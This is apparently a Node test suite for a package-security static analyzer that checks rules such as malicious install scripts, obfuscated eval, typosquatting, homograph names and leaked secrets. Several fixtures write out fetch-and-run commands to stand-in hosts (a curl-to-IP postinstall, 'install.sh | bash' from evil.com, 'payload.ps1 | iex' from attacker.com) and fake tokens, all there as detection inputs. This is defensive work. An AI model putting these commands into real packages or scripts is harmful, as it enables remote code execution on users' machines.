import { describe, it } from "node:test";
import assert from "node:assert/strict";
import { StaticAnalyzer } from "../src/scanner/static-rules.js";
import {
  SecurityLevel,
  Severity,
  FindingCategory,
} from "../src/scanner/types.js";

// ============================================================================
// Rule 1: install-script
// ============================================================================

describe("install-script rule", () => {
  const analyzer = new StaticAnalyzer();

  it("detects postinstall script fetching from raw IP via curl", () => {
    const pkg = {
      name: "evil-pkg",
      version: "1.0.0",
      scripts: {
        postinstall: "curl http://13.37.13.37/shell | sh",
      },
    };
    const report = analyzer.analyze("", pkg);
    const finding = report.findings.find(
      (f) => f.ruleId === "install-script",
    );
    assert.ok(finding);
    assert.strictEqual(finding.severity, Severity.Critical);
    assert.strictEqual(finding.category, FindingCategory.InstallScript);
    assert.ok(finding.message.includes("postinstall"));
  });

  it("detects preinstall script with wget to IP", () => {
    const pkg = {
      name: "pkg",
      version: "1.0.0",
      scripts: {
        preinstall: "wget http://192.168.1.1/payload.sh",
      },
    };
    const report = analyzer.analyze("", pkg);
    const finding = report.findings.find(
      (f) => f.ruleId === "install-script",
    );
    assert.ok(finding);
  });

  it("detects install script (not just postinstall/preinstall)", () => {
    const pkg = {
      name: "pkg",
      version: "1.0.0",
      scripts: {
        install: "curl http://10.0.0.1/evil | bash",
      },
    };
    const report = analyzer.analyze("", pkg);
    const finding = report.findings.find(
      (f) => f.ruleId === "install-script",
    );
    assert.ok(finding);
  });

  it("does not flag curl to a domain (not IP)", () => {
    const pkg = {
      name: "pkg",
      version: "1.0.0",
      scripts: {
        postinstall: "curl https://example.com/setup.sh",
      },
    };
    const report = analyzer.analyze("", pkg);
    const finding = report.findings.find(
      (f) => f.ruleId === "install-script",
    );
    assert.strictEqual(finding, undefined);
  });

  it("does not flag non-lifecycle scripts", () => {
    const pkg = {
      name: "pkg",
      version: "1.0.0",
      scripts: {
        build: "curl http://13.37.13.37/evil",
      },
    };
    const report = analyzer.analyze("", pkg);
    const finding = report.findings.find(
      (f) => f.ruleId === "install-script",
    );
    assert.strictEqual(finding, undefined);
  });

  it("does not flag when no scripts exist", () => {
    const pkg = { name: "clean", version: "1.0.0" };
    const report = analyzer.analyze("", pkg);
    const finding = report.findings.find(
      (f) => f.ruleId === "install-script",
    );
    assert.strictEqual(finding, undefined);
  });
});

// ============================================================================
// Rule 2: eval-obfuscation
// ============================================================================

describe("eval-obfuscation rule", () => {
  const analyzer = new StaticAnalyzer();

  it("detects eval() with hex-encoded strings", () => {
    const readme = 'eval("\\x48\\x65\\x6c\\x6c\\x6f")';
    const report = analyzer.analyze(readme);
    const finding = report.findings.find(
      (f) => f.ruleId === "eval-obfuscation",
    );
    assert.ok(finding);
    assert.strictEqual(finding.severity, Severity.High);
    assert.strictEqual(finding.category, FindingCategory.CodeObfuscation);
  });

  it("detects Function() with unicode escapes", () => {
    const readme = 'Function("\\u0061\\u006c\\u0065\\u0072\\u0074(1)")';
    const report = analyzer.analyze(readme);
    const finding = report.findings.find(
      (f) => f.ruleId === "eval-obfuscation",
    );
    assert.ok(finding);
  });

  it("does not flag eval() without encoded strings", () => {
    const readme = 'eval("Math.pow(2, 10)")';
    const pkg = { name: "pkg", version: "1.0.0" };
    const report = analyzer.analyze(readme, pkg);
    const finding = report.findings.find(
      (f) => f.ruleId === "eval-obfuscation",
    );
    assert.strictEqual(finding, undefined);
  });

  it("does not flag encoded strings without eval", () => {
    const readme = 'var x = "\\x41\\x42\\x43"';
    const pkg = { name: "pkg", version: "1.0.0" };
    const report = analyzer.analyze(readme, pkg);
    const finding = report.findings.find(
      (f) => f.ruleId === "eval-obfuscation",
    );
    assert.strictEqual(finding, undefined);
  });
});

// ============================================================================
// Rule 3: base64-shell
// ============================================================================

describe("base64-shell rule", () => {
  const analyzer = new StaticAnalyzer();

  it("detects base64 blob with shell keywords", () => {
    const readme =
      "echo 'dGVzdCBwYXlsb2FkIHRoYXQgaXMgdmVyeSBsb25nIGFuZCBiYXNlNjQgZW5jb2RlZA==' | base64 -d | sh";
    const report = analyzer.analyze(readme);
    const finding = report.findings.find(
      (f) => f.ruleId === "base64-shell",
    );
    assert.ok(finding);
    assert.strictEqual(finding.severity, Severity.High);
  });

  it("detects base64 with curl", () => {
    const readme =
      "curl http://evil.com/$(echo cGF5bG9hZCBkYXRhIHRoYXQgaXMgbG9uZyBhbmQgZW5jb2RlZA== | base64 -d)";
    const report = analyzer.analyze(readme);
    const finding = report.findings.find(
      (f) => f.ruleId === "base64-shell",
    );
    assert.ok(finding);
  });

  it("does not flag base64 without shell keywords", () => {
    const readme =
      "This is a long base64 string: aGVsbG8gd29ybGQgdGhpcyBpcyBhIGxvbmcgYmFzZTY0IHN0cmluZw==";
    const report = analyzer.analyze(readme);
    const finding = report.findings.find(
      (f) => f.ruleId === "base64-shell",
    );
    assert.strictEqual(finding, undefined);
  });

  it("does not flag shell keywords without base64", () => {
    const readme = "Run the script with: sh ./install.sh";
    const report = analyzer.analyze(readme);
    const finding = report.findings.find(
      (f) => f.ruleId === "base64-shell",
    );
    assert.strictEqual(finding, undefined);
  });
});

// ============================================================================
// Rule 4: binary-links
// ============================================================================

describe("binary-links rule", () => {
  const analyzer = new StaticAnalyzer();

  it("detects link to .exe file", () => {
    const readme =
      "Download the installer: https://example.com/setup.exe";
    const report = analyzer.analyze(readme);
    const finding = report.findings.find(
      (f) => f.ruleId === "binary-links",
    );
    assert.ok(finding);
    assert.strictEqual(finding.severity, Severity.Medium);
    assert.strictEqual(finding.category, FindingCategory.BinaryDownload);
  });

  it("detects link to .sh file", () => {
    const readme = "curl -sL https://evil.com/install.sh | bash";
    const report = analyzer.analyze(readme);
    const finding = report.findings.find(
      (f) => f.ruleId === "binary-links",
    );
    assert.ok(finding);
  });

  it("detects link to .ps1 file", () => {
    const readme =
      "Invoke-WebRequest https://attacker.com/payload.ps1 | iex";
    const report = analyzer.analyze(readme);
    const finding = report.findings.find(
      (f) => f.ruleId === "binary-links",
    );
    assert.ok(finding);
  });

  it("detects link to .bat file", () => {
    const readme = "Run https://company.com/tool.bat as admin";
    const report = analyzer.analyze(readme);
    const finding = report.findings.find(
      (f) => f.ruleId === "binary-links",
    );
    assert.ok(finding);
  });

  it("does not match URL with .com TLD (false positive fixed)", () => {
    const readme =
      "Documentation: https://example.com/docs/index.html";
    const report = analyzer.analyze(readme);
    const finding = report.findings.find(
      (f) => f.ruleId === "binary-links",
    );
    assert.strictEqual(finding, undefined);
  });
});

// ============================================================================
// Rule 5: typosquatting
// ============================================================================

describe("typosquatting rule", () => {
  const analyzer = new StaticAnalyzer();

  it("detects package name similar to popular package", () => {
    const pkg = { name: "ladash", version: "1.0.0" };
    const report = analyzer.analyze("", pkg);
    const finding = report.findings.find(
      (f) => f.ruleId === "typosquatting",
    );
    assert.ok(finding);
    assert.strictEqual(finding.severity, Severity.High);
    assert.ok(finding.message.includes("lodash"));
  });

  it("detects off-by-one typosquatting", () => {
    const pkg = { name: "expres", version: "1.0.0" };
    const report = analyzer.analyze("", pkg);
    const finding = report.findings.find(
      (f) => f.ruleId === "typosquatting",
    );
    assert.ok(finding);
    assert.ok(finding.message.includes("express"));
  });

  it("detects scoped typosquatting (@scope/commader)", () => {
    const pkg = { name: "@evil/commader", version: "1.0.0" };
    const report = analyzer.analyze("", pkg);
    const finding = report.findings.find(
      (f) => f.ruleId === "typosquatting",
    );
    assert.ok(finding);
    assert.ok(finding.message.includes("commander"));
  });

  it("does not flag exact match of popular package", () => {
    const pkg = { name: "lodash", version: "1.0.0" };
    const report = analyzer.analyze("", pkg);
    const finding = report.findings.find(
      (f) => f.ruleId === "typosquatting",
    );
    assert.strictEqual(finding, undefined);
  });

  it("does not flag completely different name", () => {
    const pkg = { name: "my-unique-tool", version: "1.0.0" };
    const report = analyzer.analyze("", pkg);
    const finding = report.findings.find(
      (f) => f.ruleId === "typosquatting",
    );
    assert.strictEqual(finding, undefined);
  });

  it("does not flag package without name field", () => {
    const report = analyzer.analyze("");
    const finding = report.findings.find(
      (f) => f.ruleId === "typosquatting",
    );
    assert.strictEqual(finding, undefined);
  });

  it("does not flag very short names (< 3 chars)", () => {
    const pkg = { name: "ab", version: "1.0.0" };
    const report = analyzer.analyze("", pkg);
    const finding = report.findings.find(
      (f) => f.ruleId === "typosquatting",
    );
    assert.strictEqual(finding, undefined);
  });
});

// ============================================================================
// Rule 6: secret-exposure
// ============================================================================

describe("secret-exposure rule", () => {
  const analyzer = new StaticAnalyzer();

  it("detects npm token in README", () => {
    const readme = "Token: npm_abcdefghijklmnopqrstuvwxyz";
    const report = analyzer.analyze(readme);
    const finding = report.findings.find(
      (f) => f.ruleId === "secret-exposure",
    );
    assert.ok(finding);
    assert.strictEqual(finding.severity, Severity.Critical);
    assert.strictEqual(finding.category, FindingCategory.SensitiveExposure);
  });

  it("detects AWS access key in README", () => {
    const readme = "AWS_ACCESS_KEY_ID=AKIA1234567890ABCDEF";
    const report = analyzer.analyze(readme);
    const finding = report.findings.find(
      (f) => f.ruleId === "secret-exposure",
    );
    assert.ok(finding);
  });

  it("detects SSH private key block in README", () => {
    const readme = `-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEA...
-----END RSA PRIVATE KEY-----`;
    const report = analyzer.analyze(readme);
    const finding = report.findings.find(
      (f) => f.ruleId === "secret-exposure",
    );
    assert.ok(finding);
  });

  it("detects secret in package.json fields", () => {
    const pkg = {
      name: "pkg",
      description: "npm_abcdefghijklmnopqrstuvwxyz token exposed",
    };
    const report = analyzer.analyze("", pkg);
    const finding = report.findings.find(
      (f) => f.ruleId === "secret-exposure",
    );
    assert.ok(finding);
  });

  it("does not flag clean README and package.json", () => {
    const pkg = { name: "clean", version: "1.0.0" };
    const report = analyzer.analyze("# Hello World\n\nThis is a normal README.", pkg);
    const finding = report.findings.find(
      (f) => f.ruleId === "secret-exposure",
    );
    assert.strictEqual(finding, undefined);
  });
});

// ============================================================================
// Rule 7: child-process-browser
// ============================================================================

describe("child-process-browser rule", () => {
  const analyzer = new StaticAnalyzer();

  it("detects child_process in browser-targeted package", () => {
    const readme = "const cp = require('child_process')";
    const pkg = {
      name: "react-component",
      version: "1.0.0",
      browser: "./dist/index.js",
    };
    const report = analyzer.analyze(readme, pkg);
    const finding = report.findings.find(
      (f) => f.ruleId === "child-process-browser",
    );
    assert.ok(finding);
    assert.strictEqual(finding.severity, Severity.High);
  });

  it("detects child_process in package with browser field", () => {
    const readme = "var cp = require('child_process')";
    const pkg = { name: "my-lib", version: "1.0.0", browser: "index.js" };
    const report = analyzer.analyze(readme, pkg);
    const finding = report.findings.find(
      (f) => f.ruleId === "child-process-browser",
    );
    assert.ok(finding);
  });

  it("detects child_process in package named like a frontend lib", () => {
    const readme = "require('child_process')";
    const pkg = { name: "vue-helper", version: "1.0.0" };
    const report = analyzer.analyze(readme, pkg);
    const finding = report.findings.find(
      (f) => f.ruleId === "child-process-browser",
    );
    assert.ok(finding);
  });

  it("does not flag child_process in backend package", () => {
    const readme = "const cp = require('child_process')";
    const pkg = { name: "server-utils", version: "1.0.0" };
    const report = analyzer.analyze(readme, pkg);
    const finding = report.findings.find(
      (f) => f.ruleId === "child-process-browser",
    );
    assert.strictEqual(finding, undefined);
  });

  it("does not flag browser package without child_process", () => {
    const pkg = {
      name: "react-component",
      version: "1.0.0",
      browser: "./dist/index.js",
    };
    const report = analyzer.analyze("# Hello", pkg);
    const finding = report.findings.find(
      (f) => f.ruleId === "child-process-browser",
    );
    assert.strictEqual(finding, undefined);
  });
});

// ============================================================================
// Rule 8: suspicious-build-metadata
// ============================================================================

describe("suspicious-build-metadata rule", () => {
  const analyzer = new StaticAnalyzer();

  it("detects non-standard underscore-prefixed field", () => {
    const pkg = {
      name: "pkg",
      version: "1.0.0",
      _generatedBy: "evil-tool",
    };
    const report = analyzer.analyze("", pkg);
    const finding = report.findings.find(
      (f) => f.ruleId === "suspicious-build-metadata",
    );
    assert.ok(finding);
    assert.strictEqual(finding.severity, Severity.Low);
    assert.strictEqual(finding.category, FindingCategory.Informational);
  });

  it("does not flag known underscore-prefixed fields", () => {
    const pkg = {
      name: "pkg",
      version: "1.0.0",
      _id: "pkg@1.0.0",
      _nodeVersion: "18.0.0",
      _npmVersion: "9.0.0",
    };
    const report = analyzer.analyze("", pkg);
    const finding = report.findings.find(
      (f) => f.ruleId === "suspicious-build-metadata",
    );
    assert.strictEqual(finding, undefined);
  });

  it("does not flag package without underscore fields", () => {
    const pkg = { name: "clean", version: "1.0.0" };
    const report = analyzer.analyze("", pkg);
    const finding = report.findings.find(
      (f) => f.ruleId === "suspicious-build-metadata",
    );
    assert.strictEqual(finding, undefined);
  });
});

// ============================================================================
// Rule 9: homograph-attack
// ============================================================================

describe("homograph-attack rule", () => {
  const analyzer = new StaticAnalyzer();

  it("detects Cyrillic characters in package name", () => {
    const pkg = { name: "lod\u0430sh", version: "1.0.0" };
    const report = analyzer.analyze("", pkg);
    const finding = report.findings.find(
      (f) => f.ruleId === "homograph-attack",
    );
    assert.ok(finding);
    assert.strictEqual(finding.severity, Severity.Critical);
    assert.strictEqual(finding.category, FindingCategory.HomographAttack);
  });

  it("detects non-ASCII in scoped package name", () => {
    const pkg = { name: "@scope/lod\u0430sh", version: "1.0.0" };
    const report = analyzer.analyze("", pkg);
    const finding = report.findings.find(
      (f) => f.ruleId === "homograph-attack",
    );
    assert.ok(finding);
  });

  it("does not flag pure ASCII package name", () => {
    const pkg = { name: "lodash", version: "1.0.0" };
    const report = analyzer.analyze("", pkg);
    const finding = report.findings.find(
      (f) => f.ruleId === "homograph-attack",
    );
    assert.strictEqual(finding, undefined);
  });

  it("does not flag when no name field", () => {
    const report = analyzer.analyze("");
    const finding = report.findings.find(
      (f) => f.ruleId === "homograph-attack",
    );
    assert.strictEqual(finding, undefined);
  });
});

// ============================================================================
// Rule 10: registry-mismatch
// ============================================================================

describe("registry-mismatch rule", () => {
  const analyzer = new StaticAnalyzer();

  it("detects non-standard publish registry", () => {
    const pkg = {
      name: "pkg",
      version: "1.0.0",
      publishConfig: {
        registry: "http://evil-registry.io",
      },
    };
    const report = analyzer.analyze("", pkg);
    const finding = report.findings.find(
      (f) => f.ruleId === "registry-mismatch",
    );
    assert.ok(finding);
    assert.strictEqual(finding.severity, Severity.Medium);
    assert.strictEqual(finding.category, FindingCategory.RegistryMismatch);
  });

  it("does not flag standard npm registry", () => {
    const pkg = {
      name: "pkg",
      version: "1.0.0",
      publishConfig: {
        registry: "https://registry.npmjs.org/",
      },
    };
    const report = analyzer.analyze("", pkg);
    const finding = report.findings.find(
      (f) => f.ruleId === "registry-mismatch",
    );
    assert.strictEqual(finding, undefined);
  });

  it("does not flag when no publishConfig", () => {
    const pkg = { name: "pkg", version: "1.0.0" };
    const report = analyzer.analyze("", pkg);
    const finding = report.findings.find(
      (f) => f.ruleId === "registry-mismatch",
    );
    assert.strictEqual(finding, undefined);
  });
});

// ============================================================================
// StaticAnalyzer: scoring & level computation
// ============================================================================

describe("StaticAnalyzer scoring", () => {
  const analyzer = new StaticAnalyzer();

  it("returns score 100 for clean packages", () => {
    const pkg = {
      name: "clean-pkg",
      version: "1.0.0",
    };
    const report = analyzer.analyze("# Just a normal README", pkg);
    assert.strictEqual(report.score, 100);
    assert.strictEqual(report.overallLevel, SecurityLevel.Safe);
    assert.strictEqual(report.findings.length, 0);
  });

  it("returns score < 80 for a single Critical finding", () => {
    const readme = "Token: npm_abcdefghijklmnopqrstuvwxyz";
    const report = analyzer.analyze(readme);
    assert.ok(report.score < 80);
    assert.strictEqual(report.score, 75);
    assert.strictEqual(report.overallLevel, SecurityLevel.Suspicious);
  });

  it("clamps score to minimum 0", () => {
    const pkg = {
      name: "leak",
      description: "npm_abcdefghijklmnopqrstuvwxyz",
    };
    const readme = `
      npm_zxcvbnmasdfghjklqwertyuiopasd
      AKIA1234567890ABCDEF
      -----BEGIN RSA PRIVATE KEY-----
      MIIEpA...
      -----END RSA PRIVATE KEY-----
    `;
    const report = analyzer.analyze(readme, pkg);
    assert.strictEqual(report.score, 0);
    assert.strictEqual(report.overallLevel, SecurityLevel.Unknown);
  });

  it("levels: >=80 Safe, >=50 Suspicious, >=20 Dangerous, <20 Unknown", () => {
    {
      const pkg = { name: "a", version: "1.0.0" };
      const r = analyzer.analyze("", pkg);
      assert.strictEqual(r.overallLevel, SecurityLevel.Safe);
    }
    {
      // npm token = Critical -> 100-25 = 75 -> Suspicious
      const r = analyzer.analyze("npm_abcdefghijklmnopqrstuvwxyz");
      assert.strictEqual(r.overallLevel, SecurityLevel.Suspicious);
    }
    {
      // npm token + AWS key = 2*Critical -> 100-50 = 50 -> Suspicious
      const r = analyzer.analyze(
        "npm_abcdefghijklmnopqrstuvwxyz\nAKIA1234567890ABCDEF",
      );
      assert.strictEqual(r.overallLevel, SecurityLevel.Suspicious);
    }
    {
      // npm token in README + AWS in README + SSH in README + npm in pkg = 4*Critical -> 100-100=0 → Unknown
      const pkg2 = {
        name: "bad",
        description: "npm_abcdefghijklmnopqrstuvwxyz",
      };
      const r = analyzer.analyze(
        "npm_zxcvbnmasdfghjklqwertyuiopasd\nAKIA1234567890ABCDEF\n-----BEGIN RSA PRIVATE KEY-----\nkeydata\n-----END RSA PRIVATE KEY-----",
        pkg2,
      );
      assert.strictEqual(r.overallLevel, SecurityLevel.Unknown);
    }
  });

  it("fills packageName and version from packageJson", () => {
    const pkg = { name: "my-pkg", version: "2.3.4" };
    const report = analyzer.analyze("", pkg);
    assert.strictEqual(report.packageName, "my-pkg");
    assert.strictEqual(report.version, "2.3.4");
  });

  it("uses defaults when packageJson is undefined", () => {
    const report = analyzer.analyze("");
    assert.strictEqual(report.packageName, "<unknown>");
    assert.strictEqual(report.version, "0.0.0");
    assert.strictEqual(report.score, 100);
  });

  it("includes scannedAt ISO 8601 timestamp", () => {
    const report = analyzer.analyze("");
    const date = new Date(report.scannedAt);
    assert.ok(!isNaN(date.getTime()));
  });
});

// ============================================================================
// Custom rules
// ============================================================================

describe("StaticAnalyzer with custom rules", () => {
  it("uses custom rules when provided", () => {
    const customAnalyzer = new StaticAnalyzer([
      {
        id: "custom-rule",
        name: "Custom Check",
        description: "Test",
        severity: Severity.High,
        category: FindingCategory.KnownMalicious,
        enabled: true,
        match(_readme, _packageJson) {
          return [
            {
              ruleId: "custom-rule",
              ruleName: "Custom Check",
              severity: Severity.High,
              message: "Always triggers",
              category: FindingCategory.KnownMalicious,
            },
          ];
        },
      },
    ]);
    const report = customAnalyzer.analyze("");
    assert.strictEqual(report.findings.length, 1);
    assert.strictEqual(report.findings[0].ruleId, "custom-rule");
    assert.strictEqual(report.score, 85); // 100 - 15
  });

  it("skips disabled rules", () => {
    const analyzer2 = new StaticAnalyzer([
      {
        id: "disabled-rule",
        name: "Disabled",
        description: "Should not run",
        severity: Severity.Critical,
        category: FindingCategory.Informational,
        enabled: false,
        match(_readme, _packageJson) {
          return [
            {
              ruleId: "disabled-rule",
              ruleName: "Disabled",
              severity: Severity.Critical,
              message: "Should not appear",
              category: FindingCategory.Informational,
            },
          ];
        },
      },
    ]);
    const report = analyzer2.analyze("");
    assert.strictEqual(report.findings.length, 0);
    assert.strictEqual(report.score, 100);
  });
});
